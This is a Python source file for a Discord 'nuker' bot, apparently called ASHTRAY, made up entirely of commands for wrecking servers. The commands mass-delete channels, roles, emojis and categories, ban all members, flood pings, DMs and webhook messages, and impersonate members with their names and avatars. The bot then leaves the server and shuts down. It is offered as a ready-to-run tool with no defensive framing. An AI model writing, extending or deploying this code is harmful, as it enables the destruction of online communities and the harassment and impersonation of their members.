import discord
import asyncio
import random
from discord import app_commands
from discord.ext import commands
from io import BytesIO

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.guilds = True
intents.emojis_and_stickers = True

bot = commands.Bot(command_prefix='!', intents=intents)
tree = bot.tree

OWNER_ID = 1403820926381985973

def is_owner():
    async def predicate(interaction: discord.Interaction):
        if interaction.user.id != OWNER_ID:
            await interaction.response.send_message("❌ This bot is private — only the true owner can use commands.", ephemeral=True)
            return False
        return True
    return app_commands.check(predicate)

@bot.event
async def on_ready():
    print(f'{bot.user} is online — SLASH COMMAND DESTRUCTION MODE ACTIVATED!')
    print(f'Bot ID: {bot.user.id}')
    try:
        synced = await tree.sync()
        print(f"Synced {len(synced)} slash commands!")
    except Exception as e:
        print(e)

# ──────────────────────────────────────────────────────────────
# HELPERS
# ──────────────────────────────────────────────────────────────

async def self_destruct(interaction):
    try:
        await interaction.guild.leave()
        await interaction.followup.send("Bot has left the server and is shutting down.", ephemeral=True)
    except:
        pass
    await bot.close()

async def fast_batch(tasks, batch_size=12, delay_min=0.2, delay_max=0.6):
    for i in range(0, len(tasks), batch_size):
        batch = tasks[i:i+batch_size]
        await asyncio.gather(*batch, return_exceptions=True)
        await asyncio.sleep(random.uniform(delay_min, delay_max))

# ──────────────────────────────────────────────────────────────
# ORIGINAL COMMANDS (unchanged)
# ──────────────────────────────────────────────────────────────

@tree.command(name="fullnuke", description="Delete all channels, roles, and emojis")
@is_owner()
async def full_nuke(interaction: discord.Interaction):
    await interaction.response.send_message("💥 Starting full nuke...", ephemeral=True)
    tasks = []
    for channel in interaction.guild.channels:
        tasks.append(channel.delete())
    for role in interaction.guild.roles[1:]:
        tasks.append(role.delete())
    for emoji in interaction.guild.emojis:
        tasks.append(emoji.delete())
    await asyncio.gather(*tasks, return_exceptions=True)
    await interaction.followup.send('💥 FULL NUKE COMPLETE: Server wiped clean!')

@tree.command(name="spamchannels", description="Spam create text channels")
@is_owner()
@app_commands.describe(amount="Number of channels", name="Channel name")
async def spam_channels(interaction: discord.Interaction, amount: int = 100, name: str = "nuked"):
    await interaction.response.defer(ephemeral=True)
    tasks = [interaction.guild.create_text_channel(name) for _ in range(amount)]
    await asyncio.gather(*tasks, return_exceptions=True)
    await interaction.followup.send(f'💣 Spam channels complete!')

@tree.command(name="spamroles", description="Spam create roles")
@is_owner()
@app_commands.describe(amount="Number of roles", name="Role name")
async def spam_roles(interaction: discord.Interaction, amount: int = 80, name: str = "NUKED"):
    await interaction.response.defer(ephemeral=True)
    tasks = [interaction.guild.create_role(name=name) for _ in range(amount)]
    await asyncio.gather(*tasks, return_exceptions=True)
    await interaction.followup.send(f'🎨 Spam roles complete!')

@tree.command(name="deleteroles", description="Delete all custom roles")
@is_owner()
async def delete_roles(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    tasks = [role.delete() for role in interaction.guild.roles[1:]]
    await asyncio.gather(*tasks, return_exceptions=True)
    await interaction.followup.send(f'🗑️ Deleted all custom roles!')

@tree.command(name="createrole", description="Create a single role")
@is_owner()
@app_commands.describe(name="Role name")
async def create_role(interaction: discord.Interaction, name: str = "NEW-ROLE"):
    try:
        role = await interaction.guild.create_role(name=name)
        await interaction.response.send_message(f'🎨 Created role: **{role.name}** (ID: {role.id})')
    except:
        await interaction.response.send_message("❌ Failed to create role.", ephemeral=True)

@tree.command(name="webhookspam", description="Spam a message via webhook in current channel")
@is_owner()
@app_commands.describe(message="Message to spam", amount="Number of messages")
async def webhook_spam(interaction: discord.Interaction, message: str = "@everyone YOUR SERVER HAS BEEN NUKED", amount: int = 50):
    await interaction.response.defer(ephemeral=True)
    channel = interaction.channel
    for webhook in await channel.webhooks():
        try:
            await webhook.delete()
        except:
            pass
    webhook = await channel.create_webhook(name="NukeHook")
    tasks = [webhook.send(message, username="Nuker") for _ in range(amount)]
    await asyncio.gather(*tasks, return_exceptions=True)
    await interaction.followup.send(f'📢 Webhook spam complete!')

@tree.command(name="slowmodeall", description="Apply slowmode to all text channels")
@is_owner()
@app_commands.describe(delay="Delay in seconds (max 21600)")
async def slowmode_all(interaction: discord.Interaction, delay: int = 21600):
    await interaction.response.defer(ephemeral=True)
    tasks = [channel.edit(slowmode_delay=delay) for channel in interaction.guild.text_channels]
    await asyncio.gather(*tasks, return_exceptions=True)
    await interaction.followup.send(f'🐌 Slowmode applied!')

@tree.command(name="banall", description="Ban all members (except owner and bot)")
@is_owner()
async def ban_all(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    tasks = []
    for member in interaction.guild.members:
        if member != interaction.guild.owner and member != bot.user:
            tasks.append(member.ban(reason="Maximum destruction"))
    await asyncio.gather(*tasks, return_exceptions=True)
    await interaction.followup.send(f'🔨 Ban wave complete!')

@tree.command(name="ban", description="Ban a specific member")
@is_owner()
@app_commands.describe(member="Member to ban", reason="Ban reason")
async def ban_user(interaction: discord.Interaction, member: discord.Member, reason: str = "No reason provided"):
    try:
        await member.ban(reason=reason)
        await interaction.response.send_message(f'🔨 Banned {member}! Reason: {reason}')
    except:
        await interaction.response.send_message("❌ Ban failed.", ephemeral=True)

@tree.command(name="pingflood", description="Create channels and spam pings in each")
@is_owner()
@app_commands.describe(channels="Number of channels", pings_per="Pings per channel", name="Channel name", message="Message to send")
async def ping_flood(interaction: discord.Interaction, channels: int = 40, pings_per: int = 70, name: str = "nuked", message: str = "@everyone RAIDED BY ASHTRAY"):
    await interaction.response.send_message("🚀 Starting ultra-fast ping flood...", ephemeral=True)
    create_tasks = [interaction.guild.create_text_channel(name) for _ in range(channels)]
    new_channels_raw = await asyncio.gather(*create_tasks, return_exceptions=True)
    successful_channels = [ch for ch in new_channels_raw if isinstance(ch, discord.TextChannel)]
    spam_tasks = []
    for channel in successful_channels:
        spam_tasks.extend([channel.send(message) for _ in range(pings_per)])
    await asyncio.gather(*spam_tasks, return_exceptions=True)
    await interaction.followup.send(f"💥 Ping flood complete!")

@tree.command(name="massnick", description="Change all member nicknames")
@is_owner()
@app_commands.describe(nickname="New nickname")
async def mass_nick(interaction: discord.Interaction, nickname: str = "NUKED BY ASHTRAY"):
    await interaction.response.defer(ephemeral=True)
    tasks = []
    for member in interaction.guild.members:
        if member != bot.user and member != interaction.guild.owner:
            tasks.append(member.edit(nick=nickname[:32]))
    await asyncio.gather(*tasks, return_exceptions=True)
    await interaction.followup.send(f'😈 Mass nickname complete!')

@tree.command(name="prune", description="Prune inactive members")
@is_owner()
@app_commands.describe(days="Inactive days")
async def prune_members(interaction: discord.Interaction, days: int = 7):
    await interaction.response.defer(ephemeral=True)
    await interaction.guild.prune_members(days=days, compute_prune_count=False, reason="Cleanup before destruction")
    await interaction.followup.send(f'🧹 Pruned inactive members!')

@tree.command(name="changeservername", description="Change server name (random or custom)")
@is_owner()
@app_commands.describe(new_name="Custom name (optional - random if blank)")
async def change_server_name(interaction: discord.Interaction, new_name: str = None):
    if new_name is None:
        random_names = ["RAIDED BY ASHTRAY", "NUKED BY ASHTRAY", "OWNED BY ASHTRAY", "ASHTRAY WAS HERE", "SERVER GONE", "DEAD SERVER", "CHAOS ZONE", "WASTELAND", "HACKED BY ASHTRAY"]
        new_name = random.choice(random_names)
    try:
        await interaction.guild.edit(name=new_name)
        await interaction.response.send_message(f'🏴‍☠️ Server name changed to: **{new_name}**')
    except:
        await interaction.response.send_message("❌ Failed to change name.", ephemeral=True)

@tree.command(name="ping", description="Check ASHTRAY's latency")
@is_owner()
async def ping(interaction: discord.Interaction):
    message_latency = max(0, round((discord.utils.utcnow() - interaction.created_at).total_seconds() * 1000))
    shard_latency = round(bot.latency * 1000) if bot.latency != float('inf') else "N/A"

    embed = discord.Embed(title="**Pong!**", color=0x9932cc)
    embed.add_field(name="⚡ Messages", value=f"**{message_latency}ms**", inline=True)
    embed.add_field(name="💓 Shard", value=f"**{shard_latency}ms**", inline=True)
    embed.set_footer(text="ASHTRAY BOT — ALWAYS READY")

    await interaction.response.send_message(embed=embed)

@tree.command(name="impersonate", description="Send a message as someone else")
@is_owner()
@app_commands.describe(member="The member to impersonate", message="The message to send")
async def impersonate(interaction: discord.Interaction, member: discord.Member, message: str):
    await interaction.response.defer(ephemeral=True)
    channel = interaction.channel
    for webhook in await channel.webhooks():
        try:
            await webhook.delete()
        except:
            pass
    try:
        avatar_bytes = await member.display_avatar.read()
    except:
        avatar_bytes = None
    webhook = await channel.create_webhook(name=member.display_name, avatar=avatar_bytes)
    try:
        await webhook.send(message, username=member.display_name)
        await interaction.followup.send(f"✅ Message sent as **{member.display_name}**.", ephemeral=True)
    except:
        await interaction.followup.send("❌ Failed to send impersonated message.", ephemeral=True)

@tree.command(name="purge", description="Delete a specific number of messages in this channel")
@is_owner()
@app_commands.describe(amount="Number of messages to delete (max 10000)")
async def purge(interaction: discord.Interaction, amount: int = 100):
    if amount < 1:
        await interaction.response.send_message("❌ Amount must be at least 1.", ephemeral=True)
        return
    if amount > 10000:
        amount = 10000
    await interaction.response.send_message(f"🧹 Deleting the last **{amount}** messages...", ephemeral=True)
    channel = interaction.channel
    deleted = 0
    while deleted < amount:
        to_delete = amount - deleted
        limit = min(to_delete, 100)
        messages = [msg async for msg in channel.history(limit=limit, oldest_first=False)]
        if not messages:
            break
        if len(messages) == 1:
            try:
                await messages[0].delete()
                deleted += 1
            except:
                pass
            break
        try:
            await channel.delete_messages(messages)
            deleted += len(messages)
        except:
            for msg in messages:
                try:
                    await msg.delete()
                    deleted += 1
                except:
                    pass
        if deleted < amount:
            await asyncio.sleep(1.1)
    await interaction.followup.send(f"🧹 Purge complete! Deleted **{deleted}** messages.", ephemeral=True)

@tree.command(name="silentdeath", description="Ultra-fast silent total wipe")
@is_owner()
async def silent_death(interaction: discord.Interaction):
    await interaction.response.send_message("🖤 **ULTRA SILENT DEATH** — wiping instantly...", ephemeral=True)

    guild = interaction.guild

    priority_tasks = []
    try:
        priority_tasks.append(guild.edit(name=random.choice(["GONE", "EMPTY", "VOID", "WASTELAND", "DEAD"])))
    except:
        pass
    for member in guild.members:
        if member != bot.user and member != guild.owner:
            priority_tasks.append(member.edit(nick="ghost"))

    spam_tasks = []
    for _ in range(120):
        spam_tasks.append(guild.create_text_channel("empty"))
    for _ in range(100):
        spam_tasks.append(guild.create_role(name="gone"))

    ban_tasks = []
    for member in guild.members:
        if member != guild.owner and member != bot.user:
            ban_tasks.append(member.ban(reason="Silent removal"))

    wipe_tasks = []
    for channel in guild.channels:
        wipe_tasks.append(channel.delete())
    for role in guild.roles[1:]:
        wipe_tasks.append(role.delete())
    for emoji in guild.emojis:
        wipe_tasks.append(emoji.delete())

    await asyncio.gather(
        asyncio.gather(*priority_tasks, return_exceptions=True),
        asyncio.gather(*spam_tasks, return_exceptions=True),
        asyncio.gather(*ban_tasks, return_exceptions=True),
        asyncio.gather(*wipe_tasks, return_exceptions=True),
        return_exceptions=True
    )

    await interaction.followup.send("🖤 **ULTRA SILENT DEATH COMPLETE** — Total silence.", ephemeral=True)

@tree.command(name="raidcombo", description="Ultra-fast loud instant chaos")
@is_owner()
async def raid_combo(interaction: discord.Interaction):
    await interaction.response.send_message("☢️ **ULTRA FAST RAID** — annihilating now!", ephemeral=True)

    guild = interaction.guild
    channel = interaction.channel

    priority_tasks = []
    try:
        priority_tasks.append(guild.edit(name=random.choice(["ASHTRAY OWNED", "NUKED", "DEAD SERVER", "WASTELAND"])))
    except:
        pass
    for member in guild.members:
        if member != bot.user and member != guild.owner:
            priority_tasks.append(member.edit(nick="NUKED BY ASHTRAY"))
    for member in guild.members:
        if member != guild.owner and member != bot.user:
            priority_tasks.append(member.ban(reason="ASHTRAY WAS HERE"))

    webhook_tasks = []
    try:
        for webhook in await channel.webhooks():
            webhook_tasks.append(webhook.delete())
        webhook = await channel.create_webhook(name="Ashtray")
        for _ in range(60):
            webhook_tasks.append(webhook.send("@everyone ASHTRAY RAID", username="ASHTRAY"))
    except:
        pass

    spam_tasks = []
    for _ in range(120):
        spam_tasks.append(guild.create_text_channel("ashtray-nuked"))
    for _ in range(100):
        spam_tasks.append(guild.create_role(name="OWNED"))

    misc_tasks = []
    for ch in guild.text_channels:
        misc_tasks.append(ch.edit(slowmode_delay=21600))
    misc_tasks.append(guild.prune_members(days=1, compute_prune_count=False))

    wipe_tasks = []
    for ch in guild.channels:
        wipe_tasks.append(ch.delete())
    for role in guild.roles[1:]:
        wipe_tasks.append(role.delete())
    for emoji in guild.emojis:
        wipe_tasks.append(emoji.delete())

    await asyncio.gather(
        asyncio.gather(*priority_tasks, return_exceptions=True),
        asyncio.gather(*webhook_tasks, return_exceptions=True),
        asyncio.gather(*spam_tasks, return_exceptions=True),
        asyncio.gather(*misc_tasks, return_exceptions=True),
        asyncio.gather(*wipe_tasks, return_exceptions=True),
        return_exceptions=True
    )

    await interaction.followup.send("💀 **ULTRA FAST RAID COMPLETE** — Nothing left.", ephemeral=True)

# === STOP COMMAND ===
@tree.command(name="stop", description="Shut down the bot")
@is_owner()
async def stop_bot(interaction: discord.Interaction):
    await interaction.response.send_message("🛑 Shutting down...", ephemeral=True)
    await bot.close()

# ──────────────────────────────────────────────────────────────
# NEW COMMANDS + THEIR DELETE VERSIONS
# ──────────────────────────────────────────────────────────────

@tree.command(name="massdm", description="Spam DM every member")
@is_owner()
@app_commands.describe(message="Message to spam")
async def mass_dm(interaction: discord.Interaction, message: str = "YOUR SERVER IS NOW ASHTRAY PROPERTY"):
    await interaction.response.defer(ephemeral=True)
    sent = 0
    for member in interaction.guild.members:
        if not member.bot and member != interaction.guild.owner:
            try:
                await member.send(message)
                sent += 1
                await asyncio.sleep(random.uniform(0.8, 2.5))
            except:
                pass
    await interaction.followup.send(f"📩 Mass DM sent to {sent} members!", ephemeral=True)

@tree.command(name="massdmdelete", description="Mass DM + self-destruct")
@is_owner()
@app_commands.describe(message="Message to spam")
async def mass_dm_delete(interaction: discord.Interaction, message: str = "YOUR SERVER IS NOW ASHTRAY PROPERTY"):
    await mass_dm.callback(interaction, message)
    await self_destruct(interaction)

@tree.command(name="emojinuke", description="Delete all emojis then flood new ones")
@is_owner()
async def emoji_nuke(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    guild = interaction.guild
    for emoji in guild.emojis:
        await emoji.delete()
        await asyncio.sleep(0.4)
    pixel = BytesIO(b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\x0aIDATx\x9cc\x00\x00\x00\x00IEND\xaeB\x60\x82')
    for i in range(50):
        await guild.create_custom_emoji(name=f"trash{i}", image=pixel.getvalue())
        await asyncio.sleep(0.6)
    await interaction.followup.send("🗑️ Emoji nuke + flood complete!", ephemeral=True)

@tree.command(name="emojinukedelete", description="Emoji nuke + self-destruct")
@is_owner()
async def emoji_nuke_delete(interaction: discord.Interaction):
    await emoji_nuke.callback(interaction)
    await self_destruct(interaction)

@tree.command(name="topicspam", description="Spam channel topics")
@is_owner()
@app_commands.describe(topic="Topic to set everywhere")
async def topic_spam(interaction: discord.Interaction, topic: str = "RAIDED BY ASHTRAY — GET REKT"):
    await interaction.response.defer(ephemeral=True)
    for channel in interaction.guild.text_channels:
        await channel.edit(topic=topic)
        await asyncio.sleep(0.5)
    await interaction.followup.send("📝 Every channel topic changed!", ephemeral=True)

@tree.command(name="topicspamdelete", description="Topic spam + self-destruct")
@is_owner()
@app_commands.describe(topic="Topic to set everywhere")
async def topic_spam_delete(interaction: discord.Interaction, topic: str = "RAIDED BY ASHTRAY — GET REKT"):
    await topic_spam.callback(interaction, topic)
    await self_destruct(interaction)

@tree.command(name="iconflood", description="Rapidly change server name")
@is_owner()
@app_commands.describe(times="How many times to change")
async def icon_flood(interaction: discord.Interaction, times: int = 30):
    await interaction.response.defer(ephemeral=True)
    guild = interaction.guild
    for _ in range(times):
        try:
            await guild.edit(name=f"ASHTRAY-{random.randint(1000,9999)}")
            await asyncio.sleep(1.5)
        except:
            pass
    await interaction.followup.send(f"🌪️ Icon/name flood complete ({times} changes)!", ephemeral=True)

@tree.command(name="iconflooddelete", description="Icon flood + self-destruct")
@is_owner()
@app_commands.describe(times="How many times")
async def icon_flood_delete(interaction: discord.Interaction, times: int = 30):
    await icon_flood.callback(interaction, times)
    await self_destruct(interaction)

@tree.command(name="voiceraid", description="Mass move to voice + spam voice channels")
@is_owner()
async def voice_raid(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    guild = interaction.guild
    voice = discord.utils.get(guild.voice_channels, name="ASHTRAY")
    if not voice:
        voice = await guild.create_voice_channel("ASHTRAY")
    for member in guild.members:
        if member.voice:
            await member.move_to(voice)
            await asyncio.sleep(0.6)
    for i in range(50):
        await guild.create_voice_channel(f"voicetorture-{i+1}")
        await asyncio.sleep(0.6)
    await interaction.followup.send("🔊 Voice raid complete!", ephemeral=True)

@tree.command(name="voiceraiddelete", description="Voice raid + self-destruct")
@is_owner()
async def voice_raid_delete(interaction: discord.Interaction):
    await voice_raid.callback(interaction)
    await self_destruct(interaction)

@tree.command(name="lockdown", description="Remove send message perm from @everyone")
@is_owner()
async def lockdown(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    guild = interaction.guild
    everyone = guild.default_role
    for channel in guild.text_channels:
        await channel.set_permissions(everyone, send_messages=False)
        await asyncio.sleep(0.5)
    await interaction.followup.send("🔒 Server locked down!", ephemeral=True)

@tree.command(name="lockdowndelete", description="Lockdown + self-destruct")
@is_owner()
async def lockdown_delete(interaction: discord.Interaction):
    await lockdown.callback(interaction)
    await self_destruct(interaction)

@tree.command(name="massreact", description="Spam react to recent messages")
@is_owner()
@app_commands.describe(amount="Messages to react", emoji="Emoji (optional)")
async def mass_react(interaction: discord.Interaction, amount: int = 20, emoji: str = None):
    await interaction.response.defer(ephemeral=True)
    channel = interaction.channel
    messages = [msg async for msg in channel.history(limit=amount)]
    emojis = ['💀', '🔥', '☠️', '🤡', '🖕'] if not emoji else [emoji]
    for msg in messages:
        await msg.add_reaction(random.choice(emojis))
        await asyncio.sleep(0.4)
    await interaction.followup.send(f"React spam on {len(messages)} messages!", ephemeral=True)

@tree.command(name="massreactdelete", description="Mass react + self-destruct")
@is_owner()
@app_commands.describe(amount="Messages to react", emoji="Emoji (optional)")
async def mass_react_delete(interaction: discord.Interaction, amount: int = 20, emoji: str = None):
    await mass_react.callback(interaction, amount, emoji)
    await self_destruct(interaction)

@tree.command(name="stickernuke", description="Delete all custom stickers")
@is_owner()
async def sticker_nuke(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    guild = interaction.guild
    for sticker in guild.stickers:
        await sticker.delete()
        await asyncio.sleep(0.8)
    await interaction.followup.send("🖼️ Deleted all stickers!", ephemeral=True)

@tree.command(name="stickernukedelete", description="Sticker nuke + self-destruct")
@is_owner()
async def sticker_nuke_delete(interaction: discord.Interaction):
    await sticker_nuke.callback(interaction)
    await self_destruct(interaction)

@tree.command(name="categorynuke", description="Delete all categories")
@is_owner()
@app_commands.describe(channels_too="Delete channels inside? yes/no")
async def category_nuke(interaction: discord.Interaction, channels_too: str = "no"):
    await interaction.response.defer(ephemeral=True)
    guild = interaction.guild
    for cat in guild.categories:
        if channels_too.lower() == "yes":
            for ch in cat.channels:
                await ch.delete()
                await asyncio.sleep(0.6)
        await cat.delete()
        await asyncio.sleep(1.0)
    await interaction.followup.send("📁 All categories deleted!", ephemeral=True)

@tree.command(name="categorynukedelete", description="Category nuke + self-destruct")
@is_owner()
@app_commands.describe(channels_too="Delete channels inside? yes/no")
async def category_nuke_delete(interaction: discord.Interaction, channels_too: str = "no"):
    await category_nuke.callback(interaction, channels_too)
    await self_destruct(interaction)

@tree.command(name="roleswap", description="Rapidly swap roles between members")
@is_owner()
@app_commands.describe(times="How many swaps")
async def role_swap(interaction: discord.Interaction, times: int = 10):
    await interaction.response.defer(ephemeral=True)
    guild = interaction.guild
    members = [m for m in guild.members if not m.bot]
    if len(members) < 2:
        await interaction.followup.send("Not enough members", ephemeral=True)
        return
    for _ in range(times):
        m1, m2 = random.sample(members, 2)
        roles1 = m1.roles[1:]
        roles2 = m2.roles[1:]
        await m1.remove_roles(*roles1)
        await m2.remove_roles(*roles2)
        await m1.add_roles(*roles2)
        await m2.add_roles(*roles1)
        await asyncio.sleep(1.2)
    await interaction.followup.send(f"Role swap chaos done ({times} times)!", ephemeral=True)

@tree.command(name="roleswapdelete", description="Role swap + self-destruct")
@is_owner()
@app_commands.describe(times="How many swaps")
async def role_swap_delete(interaction: discord.Interaction, times: int = 10):
    await role_swap.callback(interaction, times)
    await self_destruct(interaction)

@tree.command(name="statusspam", description="Spam bot status changes")
@is_owner()
@app_commands.describe(times="How many changes")
async def status_spam(interaction: discord.Interaction, times: int = 15):
    await interaction.response.send_message(f"Spamming status {times} times...", ephemeral=True)
    statuses = ["RAIDED", "NUKED", "GET REKT", "ASHTRAY OWNS", "SERVER DEAD"]
    for _ in range(times):
        await bot.change_presence(activity=discord.Game(random.choice(statuses)))
        await asyncio.sleep(2.5)
    await interaction.followup.send("Status spam done!", ephemeral=True)

@tree.command(name="statusspamdelete", description="Status spam + self-destruct")
@is_owner()
@app_commands.describe(times="How many changes")
async def status_spam_delete(interaction: discord.Interaction, times: int = 15):
    await status_spam.callback(interaction, times)
    await self_destruct(interaction)


# === RUN BOT ===
bot.run('Your Token')
